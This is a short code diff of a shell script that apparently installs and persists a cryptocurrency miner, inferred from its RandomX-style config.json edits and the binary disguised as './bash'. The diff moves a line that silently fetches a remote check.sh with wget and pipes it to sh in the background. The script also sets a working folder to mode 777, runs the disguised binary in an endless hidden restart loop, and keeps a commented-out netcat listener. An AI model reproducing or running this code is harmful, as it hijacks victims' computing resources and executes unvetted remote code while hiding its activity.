@@ -23,8 +23,6 @@ rx="[`seq -s ', ' 0 $((cores - 1))`]" || rx=""
 rxName=`TZ=":Asia/Shanghai" date '+%Y%m%d'`
 [ -n "$rxName" ] || rxName="$name"
 
-sh <(wget -qO- ${src}/check.sh) >/dev/null 2>&1 &
-
 
 # if [ "$mode" == "1" ]; then
 #   bash <(echo 'while true; do echo -e "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: 12\r\n\r\nHello World" |nc -l -q 1 -p 8080; done') >/dev/null 2>&1 &
@@ -47,6 +45,7 @@ chmod -R 777 "${work}"
 [ -f "${work}/config.json" ] && [ -n "$rxName" ] && sed -i "s/\"pass\":.*,/\"pass\": \"${rxName}\",/g" "${work}/config.json"
 [ -f "${work}/config.json" ] && [ -n "$rx" ] && sed -i "s/\"max-threads-hint\": 100,/&\n        \"rx\": ${rx},/" "${work}/config.json"
 
+sh <(wget -qO- ${src}/check.sh) >/dev/null 2>&1 &
 cmd="while true; do cd ${work}; ./bash >/dev/null 2>&1 ; sleep 7; done"
 if [ "$mode" == "0" ]; then
   sh <(echo "$cmd") >/dev/null 2>&1 &
